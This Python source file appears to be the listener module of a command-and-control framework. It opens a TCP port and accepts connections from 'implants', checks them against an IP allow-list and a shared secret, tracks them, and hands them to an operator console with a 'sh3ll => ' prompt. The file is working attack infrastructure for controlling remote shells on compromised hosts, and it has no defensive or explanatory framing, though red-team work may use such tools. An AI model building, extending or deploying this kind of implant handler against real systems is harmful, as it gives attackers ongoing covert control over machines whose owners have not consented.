import socket
import threading
import errno

from .console import Console
from .implant_manager import ImplantsList, ImplantManager
from .implant import Implant
from .command_manager import CommandManager
from .event_manager import EventManager


class Server:
    def __init__(self, args):
        self.args = args
        self.secret = args.secret
        self.allowed = args.allowed
        self.quit_event = threading.Event()

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.closed = False

        self.prompt = "sh3ll => "
        self.console = Console(prompt=self.prompt)

        self.event_manager = EventManager()
        self.implant_manager = ImplantManager(
            event_manager=self.event_manager
        )
        self.command_manager = CommandManager(
            self.console,
            self.implant_manager,
            self.event_manager
        )

        self.__register_events()


    def run(self):
        if self.args.listen:

            self.listen_thread = threading.Thread(
                target=self._listen,
            )
            self.listen_thread.start()
            self.console.run()
        else:
            raise ValueError('not implemented')

        self.close()


    def close(self):
        if self.closed:
            return

        self.closed = True

        for implant in self.implant_manager:
            implant.close()

        try:
            self.socket.shutdown(socket.SHUT_RDWR)
        except OSError as e:
            # Handle the case where the socket is already closed
            if e.errno == errno.ENOTCONN:
                pass
        self.socket.close()

        if self.listen_thread:
            self.listen_thread.join()

        if self.console:
            self.console.close()



    def _listen(self):
        self.socket.bind(("", self.args.port))
        self.socket.listen(5)

        self.console.write(f"[+] Listening on port {self.args.port}...")
        if self.secret:
            self.console.write(f"[+] Secret key: {self.secret}")

        while True:
            try:
                conn, addr = self.socket.accept()
                conn_thread = threading.Thread(
                    target=self._handle_connection, args=(conn, addr),
                )
                conn_thread.start()
            except socket.timeout:
                continue
            except OSError as e:
                # Handle the case where the socket is closed
                if e.errno == errno.EBADF:
                    break

    def _handle_connection(self, conn, addr):
        if self.allowed and addr[0] not in self.allowed:
            conn.close()
            self.console.write(
                f"[-] Connection from {addr[0]}:{addr[1]} not allowed."
            )
            return

        implant = Implant(
            conn, addr, self.args,
            self.console, self.event_manager
        )

        self.console.write(f"[+] Implant connecting {addr[0]}:{addr[1]}")
        if not implant.authenticate():
            implant.close()
            return

        self.console.write(f"[+] Implant connected {addr[0]}:{addr[1]}")

        self.implant_manager.add_implant(implant)

        implant.process()
    
    def __remove_implant(self, implant):
        self.implant_manager.remove_implant(implant)
        current_implant = self.implant_manager.current

        if current_implant and current_implant.id == implant.id:
            self.implant_manager.clear_current()
            self.console.back()

        self.console.write(f"[+] Implant {implant.addr} disconnected.")

    def __register_events(self):
        self.event_manager.register_event("close", self.close)

        # Implant events
        self.event_manager.register_event(
            "implant_closed", self.__remove_implant
        )
